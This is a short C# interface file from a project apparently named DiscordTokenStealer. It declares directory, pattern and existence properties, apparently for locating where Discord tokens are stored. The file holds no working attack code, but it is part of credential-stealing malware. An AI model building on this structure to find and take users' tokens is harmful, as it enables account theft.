namespace DiscordTokenStealer.DirectorySearchProviders;
public interface IDirectorySearchProvider
{
    public string Directory { get; }
    public string Pattern { get; }
    public bool Exists { get; }
}